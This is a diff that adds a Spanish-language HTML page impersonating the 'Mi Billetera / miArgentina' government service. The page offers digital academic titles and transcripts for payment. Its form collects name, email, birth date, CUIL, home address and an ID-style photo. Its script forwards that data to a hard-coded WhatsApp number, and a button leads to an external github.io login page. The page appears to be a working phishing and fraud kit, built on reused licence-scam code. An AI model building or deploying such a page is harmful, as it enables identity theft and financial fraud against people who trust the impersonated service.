@@ -1,1 +1,268 @@
-títulos.html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Analíticos académicos digitales | Mi Billetera</title>
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@100;200;300;400;500;600;700;800;900&display=swap">
+
+  <style>
+    body { font-family: 'Encode Sans', sans-serif; margin: 0; }
+    .navbar { background: #fff; border-bottom: 3px solid #ffd100; padding: 10px 20px; }
+    .navbar img { height: 70px; }
+    .header { background: #0072bb; color: white; padding: 30px; }
+    .container { max-width: 900px; margin: auto; padding: 20px; }
+
+    .btn-licencia {
+      background-color: #0072bb;
+      color: white;
+      border-radius: 25px;
+      padding: 12px 30px;
+      font-weight: 600;
+      text-transform: uppercase;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 20px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn-licencia:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 5px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .titulo-licencia{
+      text-align:center;
+      font-size:18px;
+      font-weight:700;
+      color:#0072bb;
+      margin:25px 0 10px 0;
+      text-transform:uppercase;
+    }
+
+    .img-licencia{
+      width:100%;
+      border-radius:14px;
+      overflow:hidden;
+      display:block;
+    }
+
+    .aclaracion{
+      background:#f5f5f5;
+      padding:15px;
+      border-radius:10px;
+      margin-top:15px;
+      font-size:14px;
+      line-height:1.5;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="navbar">
+  <img src="https://i.postimg.cc/638qB6NY/1776094869296.png">
+</div>
+
+<div class="header">
+  <h1>Analíticos académicos digitales</h1>
+  <p>La emisión y gestión de documentación educativa ya está disponible en Mi Billetera.</p>
+</div>
+
+<div class="container">
+  <h2>Nueva gestión de documentación académica digital</h2>
+  <p>Ahora podrá solicitar títulos, analíticos y constancias en formato digital de manera rápida y segura.</p>
+
+  <div class="titulo-licencia">ANALÍTICO DISPONIBLE</div>
+  <img src="https://i.postimg.cc/2ydqP5HM/IMG-20260419-WA0003.jpg" class="img-licencia">
+
+  <div class="titulo-licencia">TÍTULO DISPONIBLE</div>
+  <img src="https://i.postimg.cc/YSRdhmgT/IMG-20260417-WA0000.jpg" class="img-licencia">
+
+  <div style="text-align:center;">
+    <a href="https://mibilletera-servicios.github.io/licencia/login.html" class="btn-licencia">Ver documentación digital</a>
+  </div>
+
+  <h2>Formulario de inicio de trámite</h2>
+
+  <select id="tramite" onchange="mostrarCampos(); validarFormulario();" required>
+    <option value="">Seleccionar trámite</option>
+    <option value="particular">Solicitud de Analítico $180.000</option>
+    <option value="profesional">Solicitud de Título $250.000</option>
+    <option value="robo">Constancia de estudios $120.000</option>
+    <option value="vencimiento">Legalización de documentación $160.000</option>
+  </select>
+
+  <form id="formulario" oninput="validarFormulario()" onsubmit="enviarWhatsApp(event)" style="display:none;">
+
+    <input type="text" id="nombre" placeholder="Nombre" required>
+    <input type="text" id="apellido" placeholder="Apellido" required>
+
+    <input type="email" id="email" placeholder="Correo electrónico (ej: ejemplo@gmail.com)" required>
+    <div id="errorEmail" class="error">Email inválido</div>
+
+    <input type="text" id="fecha" placeholder="Fecha de nacimiento (Ej: 15/03/1990)" required>
+
+    <input type="text" id="cuil" placeholder="CUIL (Ej: 20-12345678-3)" required>
+    <div id="errorCuil" class="error">CUIL inválido</div>
+
+    <input type="text" id="provincia" placeholder="Provincia" required>
+    <input type="text" id="localidad" placeholder="Localidad" required>
+    <input type="text" id="direccion" placeholder="Dirección del domicilio" required>
+
+    <select id="categoria" style="display:none;">
+      <option value="">Seleccionar nivel educativo</option>
+    </select>
+
+    <div class="aclaracion">
+  <strong>Aclaración:</strong><br><br>
+
+  Deberá enviar una fotografía tipo DNI para validar identidad, con fondo claro y encuadre hasta la altura de los hombros. 
+  La imagen debe tomarse sin lentes ni gorras.
+  
+  <br><br>
+
+  El pago se realiza una vez finalizado el trámite.
+</div>
+
+    <button id="btnEnviar" class="btn-licencia" disabled>Enviar solicitud</button>
+
+  </form>
+
+</div>
+
+<footer style="background:#f5f5f5; padding:30px; margin-top:40px;">
+  <div class="container" style="text-align:center;">
+    <p><strong>miBilletera | Documentación Digital</strong></p>
+    <p>Gestión y visualización de documentación digital de forma rápida y segura.</p>
+    <p style="margin-top:20px; font-size:12px; color:#666;">
+      © 2026 miBilletera | miArgentina.<br>
+      Todos los derechos reservados.
+    </p>
+  </div>
+</footer>
+
+<script>
+function mostrarCampos(){
+  let tipo = document.getElementById("tramite").value;
+  let categoria = document.getElementById("categoria");
+
+  document.getElementById("formulario").style.display = "block";
+  categoria.style.display = "block";
+  categoria.innerHTML = '<option value="">Seleccionar nivel educativo</option>';
+
+  categoria.innerHTML += `
+    <option>Primario</option>
+    <option>Secundario</option>
+    <option>Terciario</option>
+    <option>Universitario</option>
+    <option>Posgrado</option>
+  `;
+}
+
+document.getElementById("cuil").addEventListener("input", function(e){
+  let valor = e.target.value.replace(/\D/g, "").substring(0,11);
+
+  if(valor.length > 2 && valor.length <= 10){
+    valor = valor.slice(0,2) + "-" + valor.slice(2);
+  } else if(valor.length > 10){
+    valor = valor.slice(0,2) + "-" + valor.slice(2,10) + "-" + valor.slice(10);
+  }
+
+  e.target.value = valor;
+});
+
+function validarCUIL(cuil){
+  return /^\d{2}-\d{8}-\d{1}$/.test(cuil);
+}
+
+function validarEmail(email){
+  return /^[^\s@]+@[^\s@]+\.(com|com\.ar|net|org|ar)$/i.test(email);
+}
+
+function validarFormulario(){
+  let tipo = document.getElementById("tramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let email = document.getElementById("email").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let provincia = document.getElementById("provincia").value;
+  let localidad = document.getElementById("localidad").value;
+  let direccion = document.getElementById("direccion").value;
+  let categoria = document.getElementById("categoria").value;
+
+  let cuilValido = validarCUIL(cuil);
+  let emailValido = validarEmail(email);
+
+  document.getElementById("errorCuil").style.display = cuil && !cuilValido ? "block" : "none";
+  document.getElementById("errorEmail").style.display = email && !emailValido ? "block" : "none";
+
+  let valido = nombre && apellido && emailValido && fecha && cuilValido && provincia && localidad && direccion && tipo && categoria;
+
+  document.getElementById("btnEnviar").disabled = !valido;
+}
+
+function enviarWhatsApp(e){
+  e.preventDefault();
+
+  let tipo = document.getElementById("tramite").value;
+  let nombre = document.getElementById("nombre").value;
+  let apellido = document.getElementById("apellido").value;
+  let email = document.getElementById("email").value;
+  let fecha = document.getElementById("fecha").value;
+  let cuil = document.getElementById("cuil").value;
+  let provincia = document.getElementById("provincia").value;
+  let localidad = document.getElementById("localidad").value;
+  let direccion = document.getElementById("direccion").value;
+  let categoria = document.getElementById("categoria").value;
+
+  let tipoTexto = "";
+  let precio = "";
+
+  if(tipo==="particular"){ tipoTexto="Solicitud de Analítico"; precio="$180.000"; }
+  if(tipo==="profesional"){ tipoTexto="Solicitud de Título"; precio="$250.000"; }
+  if(tipo==="robo"){ tipoTexto="Constancia de estudios"; precio="$120.000"; }
+  if(tipo==="vencimiento"){ tipoTexto="Legalización de documentación"; precio="$160.000"; }
+
+  let mensaje =
+`*SOLICITUD DE DOCUMENTACIÓN ACADÉMICA*
+
+📌 Tipo de trámite: ${tipoTexto}
+
+👤 Nombre: ${nombre}
+👤 Apellido: ${apellido}
+📧 Email: ${email}
+🎂 Fecha de nacimiento: ${fecha}
+🆔 CUIL: ${cuil}
+📍 Provincia: ${provincia}
+🏙️ Localidad: ${localidad}
+🏠 Dirección: ${direccion}
+🎓 Nivel educativo: ${categoria}
+
+💰 Precio: ${precio}`;
+
+  let url = "https://wa.me/5491131602393?text=" + encodeURIComponent(mensaje);
+  window.open(url, "_blank");
+}
+</script>
+
+</body>
+  </html>
